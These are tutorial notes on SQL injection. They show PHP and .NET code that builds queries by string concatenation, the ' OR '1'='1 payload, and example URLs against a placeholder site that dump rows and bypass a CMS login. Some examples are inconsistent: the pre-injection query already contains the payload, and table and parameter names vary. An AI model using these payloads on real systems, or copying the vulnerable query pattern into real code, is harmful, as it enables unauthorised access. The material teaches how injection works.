========================== Example 1 ===============================

// php code : 
$query = "SELECT * FROM Products WHERE Price < '$_GET["val"]' ORDER BY ProductDescription";

// SQL Before Injection :
SELECT *
FROM ProductsTbl
WHERE Price < '100.00' OR '1'='1'
ORDER BY ProductDescription;

// Injection Dork:
‘ OR ‘1’= ‘1

// Attempt to inject ower own SQL commands byappending them to the input parameter val
// The appended statement results in the OR operand of the query always returning true
http://www.victim.com/products.php?val=100’ OR ‘1’=’1

// SQL query after Injection :
SELECT *
FROM ProductsTbl
WHERE Price < '100.00' OR '1'='1'
ORDER BY ProductDescription;



========================== Example 2 ===============================
// PHP Code :
// dynamically build the sql statement with the input
$query = "SELECT userid FROM CMSUsers WHERE user = '$_GET["user"]' AND password = '$_GET["password"]'";

//Before Injection :
SELECT userid
FROM CMSUsers
WHERE user = 'foo' AND password = 'bar';

// Injection Dork:
‘ OR ‘1’= ‘1

//after injection : 
http://www.victim.com/cms/login.php?username=foo&password=bar’ OR ‘1’=’1
// All of the userids are returned

// SQL query after Injection :
SELECT userid
FROM CMSUsers
WHERE user = 'foo' AND password = 'password' OR '1'='1';

The logic of the application means that if the database returns more than zero records,
we must have entered the correct authentication credentials and should be redirected and
given access to the protected admin.php script. We will normally be logged in as the first
user in the CMSUsers table. An SQL injection vulnerability has allowed the application logic
to be manipulated and subverted.

===========================   Understanding How It Happens   ====================================

I. Dynamic String Building :
----------------------------

// a dynamically built sql string statement in PHP
$query = "SELECT * FROM table WHERE field = '$_GET["input"]'";

// a dynamically built sql string statement in .NET
query = "SELECT * FROM table WHERE field = '" +
request.getParameter("input") + "'";
